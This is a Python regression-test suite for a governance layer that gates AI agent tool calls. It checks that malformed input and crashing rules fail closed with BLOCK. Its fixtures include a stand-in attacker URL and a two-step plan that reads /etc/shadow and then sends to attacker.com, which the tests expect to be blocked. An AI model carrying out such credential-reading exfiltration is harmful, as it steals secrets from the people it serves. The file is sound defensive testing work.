"""
Regression tests for the *unevaluable-input* failure class.

THE INVARIANT UNDER TEST
────────────────────────
    A governance surface must never emit a permissive result for a call it
    did not successfully evaluate.

The defect documented in INPUT_VALIDATION_FAILURE_REPORT.md is one instance
of a wider class: the layer has no representation for "I could not evaluate
this". Every path that fails to produce a finding produces the same output as
a path that evaluated successfully and found nothing. `PERMIT` therefore
carries two meanings that must not be conflated:

    (a) the hierarchy ran and the trajectory does not reach Ω   — a decision
    (b) the hierarchy could not run, or ran against a state that had already
        lost the fields the rules inspect                       — no decision

Three sub-classes are covered here. They are separated because they have
different causes and a fix for one does not imply a fix for another:

    C1  UNCLASSIFIABLE INPUT — the caller supplied a shape the extractor
        cannot faithfully represent. The extractor substitutes sentinels
        (`"unknown"`, `{"raw": ...}`) that are indistinguishable from real
        values, and evaluation proceeds against the substitute.

    C2  UNEVALUABLE RULE — the input is well formed, but an Ω rule or
        admissibility check raises. This is the same "broken guard becomes an
        open door" defect one level down, and shape validation does not touch
        it.

    C3  NO VERDICT SURFACE — diagnostic and harness entry points return
        reports rather than a GovernanceResult, so they have nowhere to put a
        refusal and currently either report cleanly or crash incidentally.

WHAT "FAIL CLOSED" MEANS HERE
─────────────────────────────
Per `interception.py:9` — "a broken guard must never become an open door" —
and per the precedent the kernel already sets in
`test_kernel_redteam.py::test_fail_closed_on_governance_exception`, which
converts a raising layer into BLOCK at `layer="fail_closed"` rather than
propagating. These tests hold `GovernanceLayer` to the standard the kernel
already meets.

An incidental `TypeError` from deep inside extraction is NOT a pass. §3 of the
report explains why: the safety of a propagating exception is a property of
where it happens to land in the caller, not of any decision this layer made.
No verdict is produced, nothing is logged as a governance event, and an
ordinary `try/except` in the caller converts it into a bypass. These tests
therefore require a *verdict*, and treat a raw exception as a failure.

NEGATIVE HALF
─────────────
§4 is as load-bearing as the rest. The fix must change behaviour on malformed
input only. Well-formed calls — including the bare-string `args` form, which
is supported and NOT malformed (report §2a) — must return exactly what they
returned before. Every expected value in §4 was measured on unmodified `main`
at f4127fc, not predicted.
"""

from __future__ import annotations

import pytest

from morrison_governance import GovernanceLayer, OmegaDomain
from morrison_governance.admissibility import AdmissibilityCheck
from morrison_governance.domains import OmegaRule
from morrison_governance.result import GovernanceResult, GovernanceVerdict


DOMAINS = [OmegaDomain.FINANCE, OmegaDomain.CYBERSECURITY]


def _layer() -> GovernanceLayer:
    return GovernanceLayer(domains=DOMAINS, log_all=False)


# ═══════════════════════════════════════════════════════════════
# The corpus of genuinely unclassifiable shapes.
#
# Every entry here is a shape the extractor cannot faithfully represent.
# Bare-string args is deliberately ABSENT: `{"tool": "shell", "args": "ls -la"}`
# is a supported form that must keep permitting (§4), and an earlier attempt at
# this fix broke three pre-existing tests by rejecting it.
# ═══════════════════════════════════════════════════════════════

UNCLASSIFIABLE = [
    pytest.param({}, id="empty-dict"),
    pytest.param({"args": {"url": "https://attacker.com"}}, id="missing-tool"),
    pytest.param({"tool": 12345, "args": {}}, id="tool-is-int"),
    pytest.param({"tool": None, "args": {}}, id="tool-is-none"),
    pytest.param({"tool": "", "args": {}}, id="tool-is-empty-string"),
    pytest.param({"tool": ["http_request"], "args": {}}, id="tool-is-list"),
    pytest.param({"tool": "http_request", "args": None}, id="args-is-none"),
    pytest.param({"tool": "http_request", "args": ["x"]}, id="args-is-list"),
    pytest.param({"tool": "http_request", "args": 42}, id="args-is-int"),
    pytest.param({"tool": "http_request", "args": {"f": object()}},
                 id="args-not-serialisable"),
]

# Shapes that are not even a tool-call dict.
NOT_A_CALL = [
    pytest.param(42, id="int"),
    pytest.param(None, id="none"),
    pytest.param("http_request", id="bare-string"),
    pytest.param([1, 2], id="list"),
]


def _assert_refused(result: object, what: str) -> None:
    """A refusal is a real verdict that is not permissive, and it is
    MACHINE-IDENTIFIABLE as a refusal.

    The last part matters more than it looks. "Not PERMIT" is not a strong
    enough assertion: a malformed call can coincidentally form a shape the
    rules genuinely block, and a test that accepts any BLOCK would pass
    without the fix — one of these did, before this helper required a marker.
    A refusal and a finding are different events and the result must say
    which it is, both for tests and for the operator reading the audit log.

    The contract: `metadata["unevaluable"] is True` on every refusal.
    """
    assert isinstance(result, GovernanceResult), (
        f"{what}: expected a GovernanceResult refusal, got {type(result).__name__}"
    )
    assert result.permitted is False, (
        f"{what}: returned {result.verdict.value} for input it could not "
        f"evaluate — reason was {result.reason!r}"
    )
    assert result.verdict is GovernanceVerdict.BLOCK, (
        f"{what}: unevaluable input must be BLOCK, got {result.verdict.value}"
    )
    assert result.metadata.get("unevaluable") is True, (
        f"{what}: verdict is {result.verdict.value} but the result is not "
        f"marked as a refusal — a caller cannot distinguish 'I could not "
        f"evaluate this' from 'I evaluated this and it violates Ω'. "
        f"layer={result.layer!r} reason={result.reason!r} "
        f"metadata={result.metadata!r}"
    )


# ═══════════════════════════════════════════════════════════════
# §1 — C1: unclassifiable input, every verdict-returning entry point
#
# The report established this for four entry points. It holds for every entry
# point that returns a verdict, which is why these are parametrised over the
# entry points rather than written out for the four that were reported.
# ═══════════════════════════════════════════════════════════════


@pytest.mark.parametrize("call", UNCLASSIFIABLE)
def test_c1_evaluate_refuses(call):
    _assert_refused(_layer().evaluate(call), "evaluate")


@pytest.mark.parametrize("call", UNCLASSIFIABLE)
def test_c1_call_operator_refuses(call):
    # The middleware interface is the shape README shows for gating execution:
    #     if governance(call).permitted: execute(call)
    _assert_refused(_layer()(call), "__call__")


@pytest.mark.parametrize("call", UNCLASSIFIABLE)
def test_c1_evaluate_plan_refuses(call):
    _assert_refused(_layer().evaluate_plan([call]), "evaluate_plan")


@pytest.mark.parametrize("call", UNCLASSIFIABLE)
def test_c1_evaluate_plan_refuses_when_only_one_step_is_bad(call):
    """A plan is refused if ANY step is unevaluable. A good first step must not
    launder a bad second one."""
    good = {"tool": "read_file", "args": {"path": "/tmp/x"}}
    _assert_refused(_layer().evaluate_plan([good, call]), "evaluate_plan(mixed)")


@pytest.mark.parametrize("call", UNCLASSIFIABLE)
def test_c1_evaluate_openai_refuses(call):
    _assert_refused(_layer().evaluate_openai([call]), "evaluate_openai")


@pytest.mark.parametrize("call", UNCLASSIFIABLE)
def test_c1_evaluate_langchain_refuses(call):
    _assert_refused(_layer().evaluate_langchain([call]), "evaluate_langchain")


@pytest.mark.parametrize("call", NOT_A_CALL)
def test_c1_non_dict_input_refuses(call):
    """Report §3: these currently raise. An incidental TypeError is not a
    control — the layer must decide, not crash."""
    _assert_refused(_layer().evaluate(call), "evaluate(non-dict)")


@pytest.mark.parametrize("bad", NOT_A_CALL)
def test_c1_non_list_plan_refuses(bad):
    _assert_refused(_layer().evaluate_plan(bad), "evaluate_plan(non-list)")


def test_c1_find_admissible_refuses_unclassifiable_candidate():
    """V4 selects the first candidate that clears the hierarchy. A candidate
    that could not be evaluated must not be selectable — otherwise the
    feasibility search returns an unevaluable plan as its admissible answer."""
    g = _layer()
    result, reports = g.find_admissible(
        candidate_plans=[[{"tool": 12345, "args": {}}]],
        goal=lambda last, traj: True,
    )
    assert result.permitted is False, (
        f"find_admissible selected an unevaluable candidate: "
        f"{result.verdict.value}"
    )
    assert reports[0].admissible is False


def test_c1_evaluate_stable_refuses():
    """V5 returns (verdict, report). The verdict half must refuse."""
    g = _layer()
    result, _report = g.evaluate_stable({"tool": 12345, "args": {}},
                                        n_per_class=1)
    assert result.permitted is False, (
        f"evaluate_stable returned {result.verdict.value} for unevaluable input"
    )


# ═══════════════════════════════════════════════════════════════
# §2 — C2: an Ω rule or admissibility check that cannot be evaluated
#
# Input here is WELL FORMED. Shape validation cannot help. This is the failure
# class at the rule level, and it is the one the fail-closed principle in
# interception.py:9 was actually written about.
# ═══════════════════════════════════════════════════════════════

WELL_FORMED = {"tool": "http_request", "args": {"url": "https://example.com"}}


def _broken(_state):
    raise RuntimeError("rule predicate is broken")


def _layer_with_broken_rule() -> GovernanceLayer:
    g = _layer()
    g.add_rule(OmegaRule(
        domain=OmegaDomain.CYBERSECURITY,
        name="broken_rule",
        description="a rule whose predicate raises",
        check=_broken,
    ))
    return g


def test_c2_broken_rule_blocks_not_raises_evaluate():
    _assert_refused(_layer_with_broken_rule().evaluate(WELL_FORMED),
                    "evaluate(broken rule)")


def test_c2_broken_rule_blocks_not_raises_plan():
    _assert_refused(_layer_with_broken_rule().evaluate_plan([WELL_FORMED]),
                    "evaluate_plan(broken rule)")


def test_c2_broken_rule_blocks_not_raises_openai():
    _assert_refused(_layer_with_broken_rule().evaluate_openai([WELL_FORMED]),
                    "evaluate_openai(broken rule)")


def test_c2_broken_rule_blocks_not_raises_langchain():
    _assert_refused(_layer_with_broken_rule().evaluate_langchain([WELL_FORMED]),
                    "evaluate_langchain(broken rule)")


def test_c2_broken_admissibility_check_blocks_not_raises():
    g = _layer()
    g.add_admissibility_check(AdmissibilityCheck(
        name="broken_check",
        description="an admissibility check whose predicate raises",
        check=_broken,
    ))
    _assert_refused(g.evaluate(WELL_FORMED), "evaluate(broken check)")


def test_c2_broken_rule_refusal_names_the_cause():
    """A fail-closed BLOCK that does not say why is unmaintainable: the
    operator cannot tell a real Ω violation from a crashed rule. The refusal
    must carry the failing rule's identity."""
    r = _layer_with_broken_rule().evaluate(WELL_FORMED)
    haystack = (r.reason + " " + str(r.metadata) + " " + r.layer).lower()
    assert "broken_rule" in haystack, (
        f"refusal does not name the failing rule: reason={r.reason!r} "
        f"metadata={r.metadata!r}"
    )


def test_c2_broken_rule_is_not_silently_swallowed():
    """The failure must be recorded, not discarded. A caught-and-forgotten
    exception is the same defect wearing a BLOCK."""
    r = _layer_with_broken_rule().evaluate(WELL_FORMED)
    blob = (r.reason + " " + str(r.metadata)).lower()
    assert "runtimeerror" in blob or "rule predicate is broken" in blob, (
        f"the underlying exception is not recorded anywhere: "
        f"reason={r.reason!r} metadata={r.metadata!r}"
    )


# ═══════════════════════════════════════════════════════════════
# §3 — C3: surfaces with no verdict to return
#
# These do not gate execution, so they are not required to produce a BLOCK.
# They ARE required not to return a clean-looking report for input they could
# not evaluate, and not to fail by incidental AttributeError.
# ═══════════════════════════════════════════════════════════════


def test_c3_evaluate_all_marks_unclassifiable_input():
    """The diagnostic dict is what an operator reads to understand a decision.
    It must not render an unevaluable call as a clean sweep of non-firing
    layers."""
    diag = _layer().evaluate_all({"tool": 12345, "args": {}})
    assert isinstance(diag, dict)
    blob = str(diag).lower()
    assert "unclassifiable" in blob or "unevaluable" in blob, (
        f"evaluate_all reports no refusal for unevaluable input: {diag}"
    )


def test_c3_evaluate_all_plan_marks_unclassifiable_input():
    diag = _layer().evaluate_all_plan([{"tool": 12345, "args": {}}])
    assert isinstance(diag, dict)
    blob = str(diag).lower()
    assert "unclassifiable" in blob or "unevaluable" in blob, (
        f"evaluate_all_plan reports no refusal for unevaluable input: {diag}"
    )


def test_c3_adversarial_test_fails_deliberately_not_incidentally():
    """Currently raises AttributeError: 'int' object has no attribute 'upper'
    from inside the attack-mutation code. An offline harness may refuse by
    raising — but it must be a typed, deliberate refusal naming the reason,
    not a crash from wherever the bad value first gets touched."""
    from morrison_governance.input_validation import UnevaluableInput
    with pytest.raises(UnevaluableInput):
        _layer().adversarial_test({"tool": 12345, "args": {}})


def test_c3_estimate_robustness_fails_deliberately_not_incidentally():
    """Currently returns a RobustnessReport — a robustness number computed for
    a call that was never classified."""
    from morrison_governance.input_validation import UnevaluableInput
    with pytest.raises(UnevaluableInput):
        _layer().estimate_robustness({"tool": 12345, "args": {}},
                                     radii=(0.0,), n_per_family=1)


# ═══════════════════════════════════════════════════════════════
# §4 — the negative half: well-formed behaviour must be IDENTICAL
#
# Every expected value below was measured on unmodified main at f4127fc.
# If the fix changes any of these, the fix is wrong.
# ═══════════════════════════════════════════════════════════════

MEASURED_ON_MAIN = [
    pytest.param({"tool": "shell", "args": "ls -la"},
                 GovernanceVerdict.PERMIT, "V4", id="bare-string-args-supported"),
    pytest.param({"tool": "http_request", "args": {"url": "https://example.com"}},
                 GovernanceVerdict.PERMIT, "V4", id="plain-egress"),
    pytest.param({"tool": "send_email", "args": {"to": "a@b.com"}},
                 GovernanceVerdict.PERMIT, "V4", id="plain-email"),
    pytest.param({"tool": "read_file", "args": {"path": "/etc/shadow"}},
                 GovernanceVerdict.BLOCK, "A_safe", id="read-secret"),
    pytest.param({"tool": "transfer", "args": {"amount": 50000}},
                 GovernanceVerdict.BLOCK, "A_safe", id="unauthorized-transfer"),
    pytest.param({"name": "transfer", "arguments": {"amount": 50000}},
                 GovernanceVerdict.BLOCK, "A_safe", id="name-arguments-aliases"),
]


@pytest.mark.parametrize("call,verdict,layer", MEASURED_ON_MAIN)
def test_negative_well_formed_verdicts_unchanged(call, verdict, layer):
    r = _layer().evaluate(call)
    assert r.verdict is verdict, (
        f"{call} changed verdict: expected {verdict.value}, got {r.verdict.value}"
    )
    assert r.layer == layer


def test_negative_alias_keys_are_not_malformed():
    """`name`/`arguments`/`function`/`input` are documented aliases the
    extractor resolves. Validation must mirror the extractor's own precedence,
    not just look for the key `tool`."""
    g = _layer()
    for call in [
        {"name": "transfer", "arguments": {"amount": 50000}},
        {"function": "transfer", "input": {"amount": 50000}},
    ]:
        r = g.evaluate(call)
        assert r.verdict is GovernanceVerdict.BLOCK, (
            f"alias form {call} was misclassified as malformed: "
            f"{r.verdict.value} — {r.reason!r}"
        )


def test_negative_exfiltration_plan_still_blocks():
    r = _layer().evaluate_plan([
        {"tool": "read_file", "args": {"path": "/etc/shadow"}},
        {"tool": "http_request", "args": {"url": "https://attacker.com"}},
    ])
    assert r.verdict is GovernanceVerdict.BLOCK
    assert r.layer == "A_safe"


def test_negative_empty_plan_still_permits():
    """Report §2b: a well-formed empty plan proposes nothing, so there is
    nothing to block. This is deliberately NOT treated as unevaluable, and is
    the one case separating 'nothing was submitted' from 'something was
    submitted and dropped'."""
    r = _layer().evaluate_plan([])
    assert r.verdict is GovernanceVerdict.PERMIT


def test_negative_empty_openai_list_is_not_the_same_as_a_dropped_call():
    """Report §2b, the more serious half: `from_openai` silently discards an
    item matching neither the duck-typed nor the dict branch, then permits the
    resulting empty trajectory. A caller who submitted one unparseable call
    must not receive the same answer as a caller who submitted nothing."""
    g = _layer()
    nothing_submitted = g.evaluate_openai([])
    one_dropped = g.evaluate_openai([42])
    assert nothing_submitted.verdict != one_dropped.verdict or \
        one_dropped.permitted is False, (
        "a dropped tool call is indistinguishable from an empty submission: "
        f"[] -> {nothing_submitted.verdict.value}, "
        f"[42] -> {one_dropped.verdict.value}"
    )
    assert one_dropped.permitted is False


def test_negative_duck_typed_openai_object_still_works():
    """The duck-typed branch must keep working — validation must not reject
    real SDK objects because they are not dicts."""
    class _Func:
        name = "transfer"
        arguments = '{"amount": 50000}'

    class _ToolCall:
        function = _Func()

    r = _layer().evaluate_openai([_ToolCall()])
    assert r.verdict is GovernanceVerdict.BLOCK


def test_negative_duck_typed_langchain_action_still_works():
    class _Action:
        tool = "transfer"
        tool_input = {"amount": 50000}

    r = _layer().evaluate_langchain(_Action())
    assert r.verdict is GovernanceVerdict.BLOCK


# ═══════════════════════════════════════════════════════════════
# §5 — the production kernel path
#
# Report §6 originally said this route was not assessed. It has now been
# measured: `unknown_tool_policy` already escalates most of C1, and the kernel
# already converts a raising layer into BLOCK. The residual gap is malformed
# `args` on a KNOWN tool, which reaches PERMIT at V4.
# ═══════════════════════════════════════════════════════════════


def _kernel():
    from morrison_governance.test_kernel_redteam import _kernel as mk
    return mk()


@pytest.mark.parametrize("args", [
    pytest.param(None, id="args-none"),
    pytest.param(["x"], id="args-list"),
    pytest.param(42, id="args-int"),
])
def test_kernel_refuses_malformed_args_on_a_known_tool(args):
    """MEASURED on main: `{'tool': 'read_file', 'args': None}` -> PERMIT at V4.
    `read_file` is in the manifest, so `unknown_tool` does not catch it, and
    the malformed args survive canonicalisation."""
    d = _kernel().authorize({"tool": "read_file", "args": args})
    assert d.verdict != "PERMIT", (
        f"kernel permitted a known tool with malformed args={args!r} "
        f"at layer={d.layer}"
    )


def test_kernel_refuses_non_dict_call():
    """MEASURED on main: raises AttributeError: 'int' object has no attribute
    'get'."""
    d = _kernel().authorize(42)
    assert d.verdict != "PERMIT"


def test_kernel_already_escalates_unknown_tool_shapes():
    """Not a regression — a pin. These were measured as already-defended, and
    the fix must not downgrade them."""
    k = _kernel()
    for call in [{"tool": 12345, "args": {}},
                 {"args": {"url": "https://attacker.com"}},
                 {}]:
        d = k.authorize(call)
        assert d.verdict != "PERMIT", f"{call} -> {d.verdict}"
